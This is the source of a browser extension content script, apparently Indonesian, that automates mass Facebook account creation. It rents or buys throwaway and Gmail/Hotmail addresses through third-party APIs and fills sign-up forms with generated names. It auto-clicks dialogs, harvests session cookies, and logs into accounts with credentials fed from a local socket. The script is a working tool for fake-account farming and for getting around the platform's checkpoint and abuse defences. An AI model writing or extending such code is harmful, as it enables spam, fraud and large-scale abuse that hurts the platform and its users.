var arezdev = {
  randStr:function(length){let result = '';const characters = 'QAZWSXEDCRFVTGBYHNUJMIKOLPplmoknijbuhvygctfxrdzesawq0192837465';const charactersLength = characters.length;let counter = 0;while (counter < length) {result += characters.charAt(Math.floor(Math.random() * charactersLength));counter += 1;}return result;},
  randInt:function(min,max){return Math.floor(Math.random()*(max-min+1)+min)},
  getLinkhref:function(url){var ret=url.split("://")[0]+"://";if(url.indexOf("://")>-1){ret+=url.split('/')[2]}else{ret+=url.split('/')[0]}return ret+"/"},
  njupok_File_JS:function(a){
    var b=document.createElement("script");
    b.src=chrome.extension.getURL(a);
    document.head.appendChild(b);
  },
  nggawe_Script_JS:function(a){
    var b=document.createElement("script");
    b.textContent=a;
    document.head.appendChild(b);
  },
  html:{
    decode:function(str){if(str){return str.replace(/&#([\s\S]*?);/g,function(match,dec){if(isNaN(dec)){dec=parseInt(dec.substring(1),16)}return String.fromCharCode(dec)}).replace(/\\u003C/gi,"<").replace(/\\u00257C/g,"|").replace(/\\\//g,"/").replace(/&amp;/gi,"&").replace(/\\u0025/gi,"%").replace(/&nbsp;/gi," ").replace(/&quot;/gi,"\"").replace(/&rsquo;/gi,"'")}else{return str}},
    inputs:function(inpts){var ret={};for(x in inpts){var name="",val="",type="";try{type=/ type=\"([\s\S]*?)\"/i.exec(inpts[x])[1];name=/ name=\"([\s\S]*?)\"/i.exec(inpts[x])[1];val=/ value=\"([\s\S]*?)\"/i.exec(inpts[x])[1]}catch(e){}if(name&&type){if(!ret[type]){ret[type]={}}ret[type][name]=val;if(aing.user){if(name=="fb_dtsg"){aing.user.dtsg=val}}}}return ret},
    buttons:function(btns){var ret={};for(x in btns){var name="",val="",type="";try{type=/ type=\"([\s\S]*?)\"/i.exec(btns[x])[1];name=/ name=\"([\s\S]*?)\"/i.exec(btns[x])[1];val=/ value=\"([\s\S]*?)\"/i.exec(btns[x])[1]}catch(e){}if(name&&type){if(!ret[type]){ret[type]={}}ret[type][name]=val}}return ret},
    txtare:function(txars){var ret={};for(x in txars){var name="",val="";try{name=/ name=\"([\s\S]*?)\"/i.exec(txars[x])[1];val=/<[^>]*>([\s\S]*?)<\/[^>]*>/i.exec(txars[x])[1]}catch(e){}if(name){ret[name]=val}}return ret},
    slects:function(slcts){var ret={};for(x in slcts){var name="",isi="";try{name=/ name=\"([\s\S]*?)\"/i.exec(slcts[x])[1];isi=/<select\b([^>]*)>([\s\S]*?)<\/select>/i.exec(slcts[x])[2]}catch(e){}if(name&&isi){ret[name]={};var optns=isi.match(/<option\b([^>]*)>([\s\S]*?)<\/option>/gi);if(optns){for(y in optns){var optisi="",optval="",optslctd="";try{optisi=/<option\b([^>]*)>([\s\S]*?)<\/option>/i.exec(optns[y])[2].toLowerCase();optval=/ value=\"([\s\S]*?)\"/i.exec(optns[y])[1];optslctd=/ selected=\"([\s\S]*?)\"/i.exec(optns[y])[1]}catch(e){}if(optisi){ret[name][optisi]=optval}if(optslctd){ret[name].selected=optval}}}else{ret[name]=slcts[x]}}}return ret},
    links:function(a,uri){var ret={},c=a.match(/<a\b[^>]*>[\s\S]*?<\/a>/gi);for(x in c){if(!ret.data){ret.data=[]}var lnk={},d=/<a\b([^>]*)>([\s\S]*?)<\/a>/i.exec(c[x]);if(d&&d[1]){try{lnk.title=/ title=[\"|\'|{\\\"}]([\s\S]*?)[\"|\'|{\\\"}]/i.exec(d[1])[1]}catch(_){}try{var hrf=/ href=[\"|\'|{\\\"}]([\s\S]*?)[\"|\'|{\\\"}]/i.exec(d[1])[1];lnk.href=aing.uri.addOrigin(hrf,uri)}catch(_){lnk.props=d[1];lnk.error="This ancor has no href attribute."}lnk.text=d[2];if(lnk.text){lnk.text=lnk.text.replace(/<[^>]*>/g," ")}}else{lnk.wtf=d;lnk.error="Why can this ancor exist anyway?"}ret.data.push(lnk)}return ret},
    imgs:function(a,uri){var ret={},c=a.match(/<img\b[^>]*>/gi);for(x in c){if(!ret.data){ret.data=[]}var img={},d=/<img\b([^>]*)>/i.exec(c[x]);if(d&&d[1]){try{var src=/ src=[\"|\'|{\\\"}](.*?)[\"|\'|{\\\"}]/i.exec(d[1])[1];img.uri=aing.uri.addOrigin(src,uri)}catch(_){}try{img.alt=/ alt=[\"|\'|{\\\"}](.*?)[\"|\'|{\\\"}]/i.exec(d[1])[1]}catch(_){}try{img.title=/ title=[\"|\'|{\\\"}](.*?)[\"|\'|{\\\"}]/i.exec(d[1])[1]}catch(_){}}if(img.uri){ret.data.push(img)}}return ret},
    forms:function(a,uri){var ret={},b=aing.uri.getOrigin(uri),c=a.match(/<form\b[^>]*>[\s\S]*?<\/form>/gi);for(x in c){if(!ret.data){ret.data=[]}var frm={},d=/<form\b([^>]*)>([\s\S]*?)<\/form>/i.exec(c[x]);if(d&&d[1]&&d[2]){try{var act=/ action=\"(.*?)\"/i.exec(d[1])[1];frm.action=aing.uri.addOrigin(act,uri)}catch(e){}if(frm.action){var inpts=d[2].match(/<input\b([^>]*)>/gi),btns=d[2].match(/<button\b([^>]*)>/gi),slcts=d[2].match(/<select\b([^>]*)>([\s\S]*?)<\/select>/gi),txars=d[2].match(/<textarea\b([^>]*)>([\s\S]*?)<\/textarea>/gi);if(inpts){frm.inputs=aing.html.inputs(inpts)}if(btns){frm.buttons=aing.html.buttons(btns)}if(slcts){frm.selects=aing.html.slects(slcts)}if(txars){frm.textareas=aing.html.txtare(txars)}}else{frm.props=d[1];frm.error="This form has no action attribute."}frm.form_text=d[2].replace(/\n|<script[^>]*>[\s\S]*?script>|<[^>]*>/g," ").replace(/ +/g," ")}else{frm.wtf=d;frm.error="Why can this form exist anyway?"}ret.data.push(frm)}return ret}
  },
    uri:{
    getOrigin:function(uri){try{return uri.match(/(http[^\:]*\:\/\/[^\/]*)/i)[1]}catch(_){return false}},
    addOrigin:function(a,uri){var b=aing.uri.getOrigin(uri);if(a.substring(0,4).match(/http/i)==null){if(a.substring(0,2)=="//"){a=b.split("/")[0]+a}else if(a.substring(0,1)=="/"){a=b+a}else{a=uri+a}}return a},
    getFileName:function(uri){var a=uri.split("/")[uri.split("/").length-1].split(".")[0];if(!a){a="anonim"}return a},
    getProps:function(uri,b){if(!b){b={}}var a=uri.split("?");if(a&&a[1]){a=a[1].split("&");if(a){for(x in a){var c=a[x].split("="),d=c[0],e="no value";if(c&&c[1]){e=decodeURIComponent(c[1])}b[d]=e}}}return b},
  }
};

setTimeout(function(){
$(document).ready(function() {

if(window.location.href.match(/checkpoint/)){
    console.log("bongko !");
    return
}
  if(document.body.innerHTML.match(/Create New Group|Find friends|Cari teman|Create Story|Create story|Buat Cerita|Buat cerita/)){
    console.log('save nek fb utama')
    setTimeout(function(){
      $(document).ready(function(){      
        $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: green;padding:  10px;font-weight:  bold;color:white;'>Save cokis!!</div>");          
        arezdevCookie()
      })
    },2000)
  }

  if(window.location.href.match(/gettingstarted|home|confirmed_account/)){
    console.log('save cokis FB mobile!')
    arezdevCookie();
   }

// var cek_save_M = setInterval(() => {
// if(document.body.innerHTML.match(/Gunakake Facebook|Gunakan Facebook|Use Facebook/)){
//   arezdevCookie();
//   clearInterval(cek_save_M);
//   $(document).ready(function(){          
//     //window.location.replace("https://m.facebook.com/");
//   })
//  }
// }, 4000);

// if(document.body.innerHTML.match(/Masukkan kode dari SMS/)){
//   // console.log("tes !");
//    setTimeout(function(){ window.location.replace("https://m.facebook.com/changeemail/") },3000);
// }

if(window.location.href.match(/notifmedium/)){
     //setTimeout(function(){ window.location.replace("https://m.facebook.com/confirmemail/") },3000);
    //  setTimeout(() => {
    //   document.getElementsByClassName("_7om2 _7c_5")[1].click();
    //  }, 2000);
    //  setTimeout(() => {
    //   document.getElementsByClassName("_54k8 _8x0i _8x0j _9adg _7d06")[0].click();
    //  }, 4000);

    // arezdevCookie();
    // setTimeout(() => {
    //   try{document.querySelectorAll("a[href*='/logout.php']")[0].click()}catch(_){}
    // }, 1000);
}
	  
if(window.location.href.match(/confirmemail/)){
	
	chrome.runtime.sendMessage({get:"daftar"},(service_mail)=>{
		
if(window.ArezDev_Settings.change_email){
  // if(document.body.innerHTML.match(/Anda dapat masuk ke Google untuk mengonfirmasi akun Facebook Anda/)){
  //   clearInterval(cek_error_daftar);
  //   console.log("gak nang changeemail cuk");
  //   setTimeout(function(){ window.location.replace("/changeemail/") },3000);
  //  }
  
  // if(document.body.innerHTML.match(/Kami sudah mengirim SMS berisi kode ke/)){
  //   clearInterval(cek_error_daftar);
  //   console.log("gak nang changeemail cuk");
  //   setTimeout(function(){ window.location.replace("/changeemail/") },3000);
  //  }
  }

  if(service_mail==1){
    get_kode_Gmail()
  }
  if(service_mail==2){
    getKode_tempmailorg()
  }
  if(service_mail==3){
    getKodeHotmailbox()
  }
  if(service_mail==4){
    getKodeDichvugmail()
  }
  if(service_mail==5){
    get_kode_mailtm()
  }
  if(service_mail==6){
    get_kode_10Minute()
  }
  if(service_mail==7){
    konfirm_TempmailLOL()
  }
  if(service_mail==8){
    konfirm_generatordotmail()
  }
  if(service_mail==9){
    // arezdevCookie();
    // setTimeout(() => {
    //   try{document.querySelectorAll("a[href*='/logout.php']")[0].click()}catch(_){}
    // }, 1000);
  }  
  if(service_mail==10){
    getkode_tokoclaude();
  }
  if(service_mail==0){
    // get_code_5SIM();
  }  
  if(service_mail==11){
    
  }
	});
 }

  var cek_error_daftar = setInterval(() => {
    if(document.body.innerHTML.match(/Apakah Anda sudah punya akun Facebook?|Do you already have a Facebook account?/)){
      clearInterval(cek_error_daftar);
      console.log("error daftar");
      setTimeout(() => {
        document.getElementsByClassName("_42ft _4jy0 layerButton uiOverlayButton _4jy3 _517h _51sy")[0].click();
      }, 2200);
    }
  }, 5000);

  if(document.body.innerHTML.match(/Masuk dengan Satu Ketukan/)){
    console.log("cek log")
  }

  if(window.location.href.match(/save-device/i)){
    console.log("save device start!");
    if(window.ArezDev_Settings.change_email){
      //arezdevCookie();
      setTimeout(function(){ window.location.replace("/changeemail/") },3000);
      //setTimeout(function(){ window.location.replace("/confirmemail/") },7000);
    } else {
      setTimeout(function(){ window.location.replace("/confirmemail/") },3000);
    }
   } else if(window.location.href.match(/login/)){

    window.Lojin=new WebSocket("ws://localhost:8282");
    Lojin.onopen=function(){
      Lojin.send("la");
  };
  Lojin.onmessage=function(iyo){
    if(iyo&&iyo.data){
      //chrome.runtime.sendMessage({action:"SAVE", key: "PassRandom", value:iyo.data.split("|")[1]});
      chrome.runtime.sendMessage({login:"fbNotKonfirm",cookie:iyo.data});
      document.getElementsByName("email")[0].value=iyo.data.split("|")[1];
      document.getElementsByName("pass")[0].value=iyo.data.split("|")[2];
      setTimeout(() => {
        document.getElementsByName("login")[0].click();
      }, 2000);
	}
	Lojin.close();
  };
console.log(Lojin);

    // chrome.runtime.sendMessage({name:"akungendeng"},(a)=>{

    //     document.getElementsByName("email")[0].value=a.split("|")[1];
    //     document.getElementsByName("pass")[0].value=a.split("|")[2];
    //     setTimeout(() => {
    //       document.getElementsByName("login")[0].click();
    //     }, 2000);

    // })
    
   }
   else if(window.location.href.match(/confirmation/)){
    // setTimeout(() => {
    //   window.location.replace("/changeemail");
    // }, 2000);
   }

  if(document.body.innerHTML.match(/Permitir que Facebook utilize cookies neste browser?|Allow the use of cookies by Facebook|Izinkan penggunaan cookie oleh Facebook?|Izinkan penggunaan cookie oleh Facebook di browser ini?|Autoriser l’utilisation des cookies de Facebook sur ce navigateur|Die Verwendung von Cookies durch Facebook in diesem Browser erlauben|Permitir a utilização de cookies do Facebook neste browser|Allow the use of cookies from Facebook on this browser|Allow the use of cookies from Facebook in this browser|Het gebruik van cookies van Facebook toestaan in deze browser|Vill du tillåta cookies från Facebook i den här webbläsaren|Izinkan penggunaan cookie dari Facebook di browser ini|¿Permitir el uso de cookies de Facebook en este navegador/)){
  setTimeout(function(){
    $(document).ready(function(){
      console.log('acc cokis')
      setTimeout(function(){  document.getElementsByClassName('_54k8 _52jh _al65')[0].click() },2000)
	    setTimeout(function(){ document.getElementsByName("primary_consent_button")[0].click() },3000)
      setTimeout(function(){  document.getElementsByClassName('_54k8 _52jh _56bs _a6at _56bt')[0].click() },4000)
    })
  },2000)
}

if(window.location.href.match(/imghp/i)){
  chrome.runtime.sendMessage({name: "jenengTekomailSoket"}, (x) => {
    localStorage.logme=x
  setTimeout(function(){
    window.location.replace("https://m.facebook.com/regd/?locale=id_ID&next=https%3A%2F%2Fweb.facebook.com%2F"+localStorage.logme.split("@")[0].toLowerCase().replace(/ /gi,""));
  },12000); 
})
}

if(window.location.href.match(/action_dialog/)){
      console.log("reg re")
      document.getElementsByClassName("_54k8 _52jh _56bs _56b_ _88fo _56bw _56bt")[0].click()
}

//CP handler
if(document.body.innerHTML.match(/Kami menangguhkan akun Anda/)){
  console.log('cp ditangguhkan!');
  return
}
//CP handler

//FB dftr
 if(window.location.href.match(/r.php|reg|regd|campaign|rtime=(\d+)/i)){

  // setTimeout(() => {
  //   window.location.replace("/changeemail");
  // }, 4000);
	 
	chrome.runtime.sendMessage({get:"daftar"},(service_mail)=>{

	console.log(service_mail);	
  if(document.body.innerHTML.match(/ free.facebook.com tidak tersedia dengan browser Anda. Anda akan menggunakan data untuk menelusuri Facebook /)){
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_2 * 1000);
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_3 * 1000);
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_4 * 1000);
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_5 * 1000);
      setTimeout(function(){ try { $('[name=submit]').click() } catch(_){} },window.ArezDev_Settings.delay_Daftar_6 * 1000);
  }

  if(window.ArezDev_Settings.daftar_random_email){
    //var a = [1,2,3,4,5,6,7]
    var a = [2,6,7]
    var b = Math.floor(Math.random() * a.length)
    service_mail=a[b]
  }
  if(window.ArezDev_Settings.jeneng_indo){
    var jenengku = "jeneng";
  }
  if(window.ArezDev_Settings.jeneng_bule){
    var jenengku = "jenengFull";
  } 
chrome.runtime.sendMessage({name:jenengku}, function(b){
console.log(b);
  if(window.ArezDev_Settings.jeneng_indo){
    var Fn = b.split("|")[0];
    var Ln = b.split("|")[1];
    chrome.runtime.sendMessage({action:"SAVE",key:"Jeneng_Indo",value:Fn+"|"+Ln});
  }
  if(window.ArezDev_Settings.jeneng_bule){
    chrome.runtime.sendMessage({action:"SAVE",key:"Jeneng_Full",value:b});
  } 
  if(window.ArezDev_Settings.jeneng_soket){
    window.myWebSocketcok=new WebSocket("ws://localhost:8282");
    myWebSocketcok.onopen=function(){
      myWebSocketcok.send("la");
    };
    myWebSocketcok.onmessage=function(e){
      if(e&&e.data){
        console.log("Jeneng Soket Saiki: "+e.data)
        var Fn = e.data.split(" ")[0];
        var Ln = e.data.split(" ")[1];
        chrome.runtime.sendMessage({action:"SAVE",key:"Jeneng_Soket",value:Fn+"|"+Ln})
        setTimeout(() => {
          document.getElementsByName("firstname")[0].value=Fn+" "+Ln;
        }, window.ArezDev_Settings.delay_isi_NamaDepan * 1000);
          setTimeout(() => {
            if(window.ArezDev_Settings.daftar_web){
          document.getElementsByName("lastname")[0].value=Ln;
           }
          }, window.ArezDev_Settings.delay_isi_NamaBelakang * 1000);
          }
      myWebSocketcok.close();
    };
  }
  //============================== email area ==============================//

  //sellgmail.com
  if(service_mail == 1){
    localStorage.clear();
    var regx =  setInterval(function(){
      chrome.runtime.sendMessage({
        "action":"ajax",
        "url":"http://sellgmail.com/api/mailselling/order-rent-mail?serviceId=1&apiKey="+window.ArezDev_Settings.apikey_sellgmail,
        "method":"GET",
      },function(a){
  if(a.state == true){
          clearInterval(regx); 
          $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: green;padding:  10px;font-weight:  bold;color:white;right:0px;'>Gmail Ready !!</div>");
          console.log("status 200")
          chrome.runtime.sendMessage({action:"SAVE",key:"Gmail_ArezDev",value:a.data})
          localStorage.gmailme=a.data;
          //reg !  
          if(window.ArezDev_Settings.jeneng_melu_email){
            var Fn = a.data.substr(0,6);
            var Ln = a.data.split("@")[0].substr(5).split("0")[0].split("1")[0].split("2")[0].split("3")[0].split("4")[0].split("5")[0].split("6")[0].split("7")[0].split("8")[0].split("9")[0];
            reg(Fn,Ln,a.data);
          }      
            if(window.ArezDev_Settings.jeneng_indo){
              chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Indo"},(jeneng)=>{
                var Fn = jeneng.split("|")[0];
                var Ln = jeneng.split("|")[1];
                reg(Fn,Ln,a.data);
              });
            }
            if(window.ArezDev_Settings.jeneng_bule){
			  chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Full"},(jeneng)=>{
				var Fn = jeneng.split(" ")[0];
                var Mn = jeneng.split(" ")[1];
                var Ln = a.data.substr(0,5);
                reg(Fn+" "+Mn,Ln,a.data);
                });
            }
        } //if true gmail
        else if(a.msg == "NOT ENOUGH QUANTITY"){
          if(window.ArezDev_Settings.sellgmail_requestAPI){
           } else {
            clearInterval(regx)
          }
          console.log("STOK HABIS!");
          $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: red;padding:  10px;font-weight:  bold;color:white;right:0px;'>Stok gmail entek !!</div>");
        }
        else if(a.msg == "NOT ENOUGH BALANCE"){          
          $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: red;padding:  10px;font-weight:  bold;color:white;right:0px;'>Saldo entek !!</div>");
        } 
      })
    },window.ArezDev_Settings.delay_sellgmail_requestAPI * 1000);
   }
//sellgmail.com

//Temp-mail.org
   if(service_mail == 2){
chrome.runtime.sendMessage({email:"Temp-mail.org"}, function(b){
  console.log(b);
  chrome.runtime.sendMessage({action:"SAVE", key: "TempMailorg_ArezDev", value:b.mailbox+"|"+b.token})
  if(b.mailbox){          
    $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: green;padding:  10px;font-weight:  bold;color:white;'>Temp-mail.org Ready !!</div>");          var Dino = arezdev.randInt(1,28)             
    if(window.ArezDev_Settings.jeneng_melu_email){
      var Fn = b.mailbox.substr(0,6);
      var Ln = b.mailbox.substr(0,6);
    }
    //reg !    
        if(window.ArezDev_Settings.jeneng_indo){
          chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Indo"},(jeneng)=>{
            var Fn = jeneng.split("|")[0];
            var Ln = jeneng.split("|")[1];
            reg(Fn,Ln,b.mailbox);
          });
        }
        if(window.ArezDev_Settings.jeneng_bule){
          chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Bule"},(jeneng)=>{
            var Fn = jeneng.split("|")[0];
            var Ln = jeneng.split("|")[1];
            reg(Fn,Ln,b.mailbox);
          });
        }
      } //if Email
      else if(b.errorMessage){
        $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: red;padding:  10px;font-weight:  bold;color:white;'>LIMIT !!</div>");
      } //if Email
    }) //get Email
  }
//Temp-mail.org

//Hotmailbox.me
if(service_mail == 3){
  if(window.ArezDev_Settings.daftar_hotmailbox_api){
    if(window.ArezDev_Settings.hotmailbox_mode_random){
      var xx = ["OUTLOOK.CO.ID","OUTLOOK.COM.AU","OUTLOOK.COM.AR","OUTLOOK.AT","OUTLOOK.BE","OUTLOOK.COM.BR","OUTLOOK.CZ","OUTLOOK.CL","OUTLOOK.DK","OUTLOOK.FR","OUTLOOK.COM.GR","OUTLOOK.DE","OUTLOOK.HU","OUTLOOK.IN","OUTLOOK.IE","OUTLOOK.CO.IL","OUTLOOK.IT","OUTLOOK.JP","OUTLOOK.KR","OUTLOOK.LV","OUTLOOK.PT","OUTLOOK.SG","OUTLOOK.SK","OUTLOOK.ES","OUTLOOK.CO.TH"];
      var xxx = Math.floor(Math.random() * xx.length);
      window.ArezDev_Settings.hotmailbox_mode=xx[xxx];
      }
    chrome.runtime.sendMessage({email:"hotmail",url:"https://api.hotmailbox.me/mail/buy?apikey="+window.ArezDev_Settings.apikey_hotmail+"&mailcode="+window.ArezDev_Settings.hotmailbox_mode+"&quantity=1"}, function(b){
      console.log(b);
      if(b){        
        chrome.runtime.sendMessage({action:"SAVE", key: "HotmailBox_ArezDev", value:b.split("|")[0]+"|"+b.split("|")[1]});  
        $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: green;padding:  10px;font-weight:  bold;color:white;'>Hotmail Ready !!</div>");                   
        if(window.ArezDev_Settings.jeneng_melu_email){
          var Fn = b.split("|")[0].substr(0,6);
          var Ln = b.split("|")[0].split("@")[0].substr(5).split("0")[0].split("1")[0].split("2")[0].split("3")[0].split("4")[0].split("5")[0].split("6")[0].split("7")[0].split("8")[0].split("9")[0];
          reg(Fn,Ln,b.split("|")[0]);
        }
    //reg !    
    if(window.ArezDev_Settings.jeneng_indo){
      chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Indo"},(jeneng)=>{
        var Fn = jeneng.split("|")[0];
        var Ln = jeneng.split("|")[1];
        reg(Fn,Ln,b.split("|")[0]);
      });
    }
    if(window.ArezDev_Settings.jeneng_bule){
      chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Bule"},(jeneng)=>{
        var Fn = jeneng.split("|")[0];
        var Ln = jeneng.split("|")[1];
        reg(Fn,Ln,b.split("|")[0]);
      });
    }
      }
      //if email
    }) //get Email
  } else {
    window.daftarHotmailboxsocket=new WebSocket("ws://localhost:8282");
    window.daftarHotmailboxsocket.onopen=function(){
      window.daftarHotmailboxsocket.send("em");
    };
    window.daftarHotmailboxsocket.onmessage=(hotmailsoket)=>{
      if(hotmailsoket&&hotmailsoket.data){
      chrome.runtime.sendMessage({action:"SAVE", key: "HotmailBox_ArezDev", value:hotmailsoket.data.split("|")[0]+"|"+hotmailsoket.data.split("|")[1]});       
      if(window.ArezDev_Settings.jeneng_melu_email){
      var Fn = hotmailsoket.data.split("|")[0].substr(0,6);
      var Ln = hotmailsoket.data.split("|")[0].split("@")[0].substr(5).split("0")[0].split("1")[0].split("2")[0].split("3")[0].split("4")[0].split("5")[0].split("6")[0].split("7")[0].split("8")[0].split("9")[0];
      reg(Fn,Ln,hotmailsoket.data.split("|")[0]);
    }
    //reg !    
    if(window.ArezDev_Settings.jeneng_indo){
      chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Indo"},(jeneng)=>{
        var Fn = jeneng.split("|")[0];
        var Ln = jeneng.split("|")[1];
        reg(Fn,Ln,hotmailsoket.data.split("|")[0]);
      });
    }
    if(window.ArezDev_Settings.jeneng_bule){
      chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Bule"},(jeneng)=>{
        var Fn = jeneng.split("|")[0];
        var Ln = jeneng.split("|")[1];
        reg(Fn,Ln,hotmailsoket.data.split("|")[0]);
      });
    }
          }
          window.daftarHotmailboxsocket.close();
    };
  } //kondisi API atau Soket
}
//Hotmailbox.me

//Dichvugmail.com
if(service_mail==4){
  var getDichvu = setInterval(()=>{
    chrome.runtime.sendMessage({email:"dichvu",apiKey:window.ArezDev_Settings.apikey_dichvugmail,path:"Facebook"},(f) => {
		console.log(f);
		if(f.msg=="No Mail Now"){
      $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: red;padding:  10px;font-weight:  bold;color:white;right:0px;'>Stok gmail entek !!</div>");          
		}else if(f.orders.gmail){
      clearInterval(getDichvu);
      $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: green;padding:  10px;font-weight:  bold;color:white;right:0px;'>Gmail Ready !!</div>");          
      chrome.runtime.sendMessage({action:"SAVE", key: "Dichvugmail_Email_ArezDev", value:f.orders.gmail});
      chrome.runtime.sendMessage({action:"SAVE", key: "Dichvugmail_ID_ArezDev", value:f.orders.order_id});
      //reg !
          if(window.ArezDev_Settings.jeneng_melu_email){
            var Fn = f.orders.gmail.substr(0,6);
            var Ln = f.orders.gmail.split("@")[0].substr(5).split("0")[0].split("1")[0].split("2")[0].split("3")[0].split("4")[0].split("5")[0].split("6")[0].split("7")[0].split("8")[0].split("9")[0];
            reg(Fn,Ln,f.orders.gmail);
          }
          if(window.ArezDev_Settings.jeneng_indo){
            chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Indo"},(jeneng)=>{
              var Fn = jeneng.split("|")[0];
              var Ln = jeneng.split("|")[1];
              reg(Fn,Ln,f.orders.gmail);
            });
          }
          if(window.ArezDev_Settings.jeneng_bule){
            chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Full"},(jeneng)=>{
              var Fn = jeneng.split(" ")[0];
              var Mn = jeneng.split(" ")[1];
              var Ln = f.orders.gmail.substr(0,4);
              //var Ln = f.orders.gmail.split("@")[0].substr(5).split("0")[0].split("1")[0].split("2")[0].split("3")[0].split("4")[0].split("5")[0].split("6")[0].split("7")[0].split("8")[0].split("9")[0];
              reg(Fn+" "+Mn,Ln,f.orders.gmail);
            });
          } 
        }// if emails   
	  if(window.ArezDev_Settings.dichvugmail_requestAPI){
        } else {
         clearInterval(getDichvu);
       }		
      }) //get email!
     },window.ArezDev_Settings.delay_dichvugmail_requestAPI * 1000) //delay get mail!
}
//Dichvugmail.com

//Mail.tm
if(service_mail==5){
  chrome.runtime.sendMessage({
    email:"mailtm",
    path:"accounts",
    body:"{\"address\": \""+Fn+Ln+arezdev.randInt(1111,9999)+"\@exelica.com\",\"password\":\"S1WAL4N\"}"
  },(b)=>{
    console.log(b);
    chrome.runtime.sendMessage({action:"SAVE", key: "MailTM_data_ArezDev", value:b.address});
    //Reg !          
    if(window.ArezDev_Settings.jeneng_indo){
      chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Indo"},(jeneng)=>{
        var Fn = jeneng.split("|")[0];
        var Ln = jeneng.split("|")[1];
        reg(Fn,Ln,b.address);
      });
    }
    if(window.ArezDev_Settings.jeneng_bule){
      chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Bule"},(jeneng)=>{
        var Fn = jeneng.split("|")[0];
        var Ln = jeneng.split("|")[1];
        reg(Fn,Ln,b.address);
      });
    }
  }); //email
}
//Mail.tm

//10minutemail.net
if(service_mail==6){
  var get10MinuteMail = setInterval(() => {
    chrome.runtime.sendMessage({email:"10Minutemail",path:"/address.api.php?new=1"},(b)=>{
      console.log(b);
      if(b.mail_get_mail.match(/zbock/)){

      }else{
        clearInterval(get10MinuteMail)
        //reg
  chrome.runtime.sendMessage({action:"SAVE", key: "10MinuteMail_data_ArezDev", value:b.mail_get_mail});
  if(window.ArezDev_Settings.jeneng_indo){
    chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Indo"},(jeneng)=>{
      var Fn = jeneng.split("|")[0];
      var Ln = jeneng.split("|")[1];
      reg(Fn,Ln,b.mail_get_mail);
    });
  }
  if(window.ArezDev_Settings.jeneng_bule){
    chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Bule"},(jeneng)=>{
      var Fn = jeneng.split("|")[0];
      var Ln = jeneng.split("|")[1];
      reg(Fn,Ln,b.mail_get_mail);
    });
  }
      } //if email
    })//emails
  }, 5000);
}
//10minutemail.net

//Tempmail.lol
if(service_mail==7){
  chrome.runtime.sendMessage({email:"tempmailol"},(email)=>{
    chrome.runtime.sendMessage({action:"SAVE", key: "TempmailLol_data_ArezDev", value:email.split("|")[0]});
    chrome.runtime.sendMessage({action:"SAVE", key: "Token_TempmailLol_data_ArezDev", value:email.split("|")[1]});
    if(email){
      if(window.ArezDev_Settings.jeneng_indo){
      chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Indo"},(jeneng)=>{
        var Fn = jeneng.split("|")[0];
        var Ln = jeneng.split("|")[1];
        reg(Fn,Ln,email.split("|")[0]);
      });
    }
    if(window.ArezDev_Settings.jeneng_bule){
      chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Bule"},(jeneng)=>{
        var Fn = jeneng.split("|")[0];
        var Ln = jeneng.split("|")[1];
        reg(Fn,Ln,email.split("|")[0]);
      });
    }
   }
 })
}

//generator.email
if(service_mail==8){
 window.generatormailSoket=new WebSocket("ws://localhost:8282");
 window.generatormailSoket.onopen=function(){
   window.generatormailSoket.send("em");
 };
 window.generatormailSoket.onmessage=(generatormail)=>{
   if(generatormail&&generatormail.data){ 
 //reg !    
 if(window.ArezDev_Settings.jeneng_indo){
   chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Indo"},(jeneng)=>{
     var Fn = jeneng.split("|")[0];
     var Ln = jeneng.split("|")[1];
     chrome.runtime.sendMessage({action:"SAVE", key: "GeneratorMail_data_ArezDev", value:Fn.toLowerCase()+Ln.toLowerCase()+arezdev.randInt(100,999)+"@"+generatormail.data});
     setTimeout(() => {
     chrome.runtime.sendMessage({action:"LOAD", key: "GeneratorMail_data_ArezDev"},(emailku)=>{
      reg(Fn,Ln,emailku);
     })
     }, 1000);
   });
 }
 if(window.ArezDev_Settings.jeneng_bule){
   chrome.runtime.sendMessage({action:"LOAD",key:"Jeneng_Bule"},(jeneng)=>{
     var Fn = jeneng.split("|")[0];
     var Ln = jeneng.split("|")[1];
     chrome.runtime.sendMessage({action:"SAVE", key: "GeneratorMail_data_ArezDev", value:Fn.toLowerCase()+Ln.toLowerCase()+arezdev.randInt(100,999)+"@"+generatormail.data});
     setTimeout(() => {
     chrome.runtime.sendMessage({action:"LOAD", key: "GeneratorMail_data_ArezDev"},(emailku)=>{
      reg(Fn,Ln,emailku);
     })
     }, 1000);
   });
 }
    }
  window.generatormailSoket.close();
